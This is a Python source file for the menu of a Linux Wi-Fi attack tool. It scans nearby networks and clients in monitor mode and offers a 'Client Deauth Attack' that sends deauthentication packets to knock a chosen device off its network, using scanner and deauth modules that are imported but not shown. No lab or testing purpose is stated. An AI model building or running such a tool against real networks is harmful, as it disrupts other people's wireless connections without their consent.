## THIS PROGRAM ONLY WORKS ON LINUX
##
## SYSTEM DEPENDENCIES:
## sudo apt install iw

import os
import sys
import questionary

from prompt_toolkit.styles import Style
from scapy.config import conf

from constants import *
from utils import *
from scanner import run_scanner
from monitor_mode import monitor_mode
from deauth import send_deauth

ENTER_BACK_TEXT = '\n[Press ENTER to go back...]'

SCAN_ACTION = 'Scan Networks'
CLIENT_DEAUTH_ATTACK_ACTION = 'Client Deauth Attack'
NETWORK_DEAUTH_ATTACK_ACTION = 'Network Deauth Attack'
BACK_ACTION = 'Back'
EXIT_ACTION = 'Exit'

custom_style = Style([
    ('question', 'bold'),
    ('answer', 'fg:white'),
    ('pointer', 'bold'),
    ('highlighted', 'bold'),
])

def clear_screen():
    os.system('clear')

def print_banner(text):
    chars = len(text)
    pad = 10

    print((2 * pad + chars) * '=')
    print(pad * ' ' + text + pad * ' ')
    print((2 * pad + chars) * '=')
    print()

def unpack_client(c):
    return c['client_mac'], c['ssid'], c['bssid'], c['channel'], c['crypto']

def run_selection(text, choices):
    return questionary.select(
        text,
        choices=choices,
        qmark='',
        pointer='->',
        style=custom_style
    ).ask()


session_networks = []
session_clients = []

def handle_scan_menu(interface):
    global session_networks
    global session_clients
    clear_screen()

    input(f'[Press ENTER to go into monitor mode and start scanning...]\n')
    session_networks, session_clients = run_scanner(interface)
    print(f'\nScan complete. Saved {len(session_networks)} networks to memory.')
    input(ENTER_BACK_TEXT)
    

def handle_client_select_menu():
    global session_clients    
    clear_screen()

    if not session_clients:
        print('Run a scan. No clients were discovered.')
        input(ENTER_BACK_TEXT)
        return None
            
    # selection header
    header = f"{'CLIENT MAC':<17} | {'SSID':<22} | {'BSSID':<17} | {'CH':<3} | {'CRYPTO':<8}"
    choices = [
        questionary.Separator(f'{header}'),
        questionary.Separator('-' * 81)
    ]

    # selection options
    for client in session_clients:
        mac, ssid, bssid, channel, crypto = unpack_client(client)
        row_title = f'{mac:<17} | {ssid[:22]:<22} | {bssid:<17} | {channel:<3} | {crypto:<8}'        
        choices.append(questionary.Choice(title=row_title, value=client))

    # selection footer
    choices.append(questionary.Separator('-' * 81))
    choices.append(BACK_ACTION)

    choice = run_selection('Select a client to deauthenticate:', choices)

    if choice == BACK_ACTION or choice is None:
        return None

    return choice


def handle_client_deauth_menu(interface):
    target = handle_client_select_menu()

    if not target:
        return
    
    client_mac, ssid, bssid, channel, crypto = unpack_client(target)
    print(f'\nSelected target {client_mac} on network {ssid}.')

    with monitor_mode(interface) as interface:
        print(f'\n({interface}) Sending {DEAUTH_PACKET_COUNT} deauthetication packets to {client_mac}.\n')
        send_deauth(interface, bssid, client_mac, channel, num_packets=DEAUTH_PACKET_COUNT)

    input(ENTER_BACK_TEXT)


def main_menu():
    interface = 'wlp193s0'

    while True:
        clear_screen()
        print_banner('MAIN MENU')

        action = questionary.select(
            'Select action:',
            choices=[
                SCAN_ACTION,
                CLIENT_DEAUTH_ATTACK_ACTION,
                questionary.Separator('-' * 40),
                EXIT_ACTION
            ],
            qmark='',
            pointer='->', 
            style=custom_style    
        ).ask()

        if action == 'Exit' or action is None:
            clear_screen()
            sys.exit(0)
            
        elif action == SCAN_ACTION:
            handle_scan_menu(interface)
            
        elif action == CLIENT_DEAUTH_ATTACK_ACTION:
            handle_client_deauth_menu(interface)

if __name__ == "__main__":
    conf.verb = 0
    conf.use_pcap = True
    ensure_root()
    load_dotenv()
    main_menu()
